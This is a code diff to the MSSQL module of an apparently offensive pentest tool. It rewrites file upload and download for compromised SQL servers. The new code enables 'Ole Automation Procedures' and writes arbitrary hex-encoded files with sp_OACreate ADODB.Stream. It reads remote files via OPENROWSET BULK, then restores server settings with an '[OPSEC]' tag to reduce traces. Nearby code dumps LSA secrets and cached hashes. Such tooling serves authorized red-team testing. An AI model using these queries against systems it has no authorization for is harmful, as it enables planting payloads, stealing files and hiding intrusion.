@@ -1,5 +1,6 @@
 import os
 import random
+import binascii
 import contextlib
 from termcolor import colored
 
@@ -48,6 +49,7 @@ class mssql(connection):
         self.nthash = ""
         self.no_ntlm = False
         self.args = args
+        self.backuped_options = {}
 
         connection.__init__(self, args, db, host)
 
@@ -343,7 +345,7 @@ class mssql(connection):
             current_method = method
             if method == "mssqlexec":
                 try:
-                    exec_method = MSSQLEXEC(self.conn, self.logger)
+                    exec_method = MSSQLEXEC(self)
                     self.logger.debug("MSSQLEXEC execution method instantiated")
                     break
                 except Exception as e:
@@ -351,7 +353,7 @@ class mssql(connection):
                     continue
             elif method == "oleexec":
                 try:
-                    exec_method = OLEEXEC(self.conn, self.logger)
+                    exec_method = OLEEXEC(self)
                     self.logger.debug("OLEEXEC execution method instantiated")
                     break
                 except Exception as e:
@@ -359,7 +361,7 @@ class mssql(connection):
                     continue
             elif method == "clrexec":
                 try:
-                    exec_method = CLREXEC(self.conn, self.logger)
+                    exec_method = CLREXEC(self)
                     self.logger.debug("CLREXEC execution method instantiated")
                     break
                 except Exception as e:
@@ -442,19 +444,24 @@ class mssql(connection):
 
     @requires_admin
     def put_file(self):
-        self.logger.display(f"Copy {self.args.put_file[0]} to {self.args.put_file[1]}")
-        with open(self.args.put_file[0], "rb") as f:
+        download_path = self.args.put_file[0]
+        remote_path = self.args.put_file[1]
+        self.logger.display(f"Copy {download_path} to {remote_path}")
+        with open(download_path, "rb") as f:
+            data = f.read()
+            self.logger.display(f"Size is {len(data)} bytes")
             try:
-                data = f.read()
-                self.logger.display(f"Size is {len(data)} bytes")
-                exec_method = MSSQLEXEC(self.conn, self.logger)
-                exec_method.put_file(data, self.args.put_file[1])
-                if exec_method.file_exists(self.args.put_file[1]):
-                    self.logger.success("File has been uploaded on the remote machine")
-                else:
-                    self.logger.fail("File does not exist on the remote system... error during upload")
+                self.backup_and_enable("advanced options")
+                self.backup_and_enable("Ole Automation Procedures")
+                hexdata = data.hex()
+                self.logger.debug(f"Hex data to write to file: {hexdata}")
+                query = f"DECLARE @ob INT;EXEC sp_OACreate 'ADODB.Stream', @ob OUTPUT;EXEC sp_OASetProperty @ob, 'Type', 1;EXEC sp_OAMethod @ob, 'Open';EXEC sp_OAMethod @ob, 'Write', NULL, 0x{hexdata};EXEC sp_OAMethod @ob, 'SaveToFile', NULL, '{remote_path}', 2;EXEC sp_OAMethod @ob, 'Close';EXEC sp_OADestroy @ob;"
+                self.logger.debug(f"Executing query: {query}")
+                self.conn.sql_query(query)
+                self.restore("Ole Automation Procedures")
+                self.restore("advanced options")
             except Exception as e:
-                self.logger.fail(f"Error during upload : {e}")
+                self.logger.debug(f"Error uploading via mssqlexec: {e}")
 
     @requires_admin
     def get_file(self):
@@ -463,8 +470,13 @@ class mssql(connection):
         self.logger.display(f'Copying "{remote_path}" to "{download_path}"')
 
         try:
-            exec_method = MSSQLEXEC(self.conn, self.logger)
-            exec_method.get_file(self.args.get_file[0], self.args.get_file[1])
+            query = f"SELECT * FROM OPENROWSET(BULK N'{remote_path}', SINGLE_BLOB) rs"
+            self.logger.debug(f"Executing query: {query}")
+            self.conn.sql_query(query)
+            data = self.conn.rows
+            self.logger.debug(f"Get file returned: {data}")
+            with open(download_path, "wb+") as f:
+                f.write(binascii.unhexlify(data[0]["BulkColumn"]))
             self.logger.success(f'File "{remote_path}" was downloaded to "{download_path}"')
         except Exception as e:
             self.logger.fail(f'Error reading file "{remote_path}": {e}')
@@ -695,3 +707,46 @@ class mssql(connection):
             )
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
+
+    def is_option_enabled(self, option):
+        query = f"EXEC master.dbo.sp_configure '{option}';"
+        self.logger.debug(f"Checking if '{option}' is enabled: {query}")
+        result = self.conn.sql_query(query)
+        self.logger.debug(f"'{option}' check result: {result}")
+        return bool(result and result[0]["config_value"] == 1)
+
+    @requires_admin
+    def backup_and_enable(self, option):
+        try:
+            self.backuped_options[option] = self.is_option_enabled(option)
+            if not self.backuped_options[option]:
+                self.logger.debug(f"Option '{option}' is disabled, enabling it.")
+                self.conn.sql_query(f"EXEC master.dbo.sp_configure '{option}', 1;RECONFIGURE;")
+            else:
+                self.logger.debug(f"Option '{option}' is already enabled.")
+        except Exception as e:
+            self.logger.error(f"Error enabling '{option}': {e}")
+
+    @requires_admin
+    def backup_and_disable(self, option):
+        try:
+            self.backuped_options[option] = self.is_option_enabled(option)
+            if self.backuped_options[option]:
+                self.logger.debug(f"Option '{option}' is enabled, disabling it.")
+                self.conn.sql_query(f"EXEC master.dbo.sp_configure '{option}', 0;RECONFIGURE;")
+            else:
+                self.logger.debug(f"Option '{option}' is already disabled.")
+        except Exception as e:
+            self.logger.error(f"Error disabling '{option}': {e}")
+
+    @requires_admin
+    def restore(self, option):
+        try:
+            original = self.backuped_options.get(option)
+            if original is None:
+                return
+            target_val = 1 if original else 0
+            self.logger.debug(f"Restoring '{option}' to {target_val}.")
+            self.conn.sql_query(f"EXEC master.dbo.sp_configure '{option}', {target_val};RECONFIGURE;")
+        except Exception as e:
+            self.logger.error(f"[OPSEC] Error restoring '{option}': {e}")
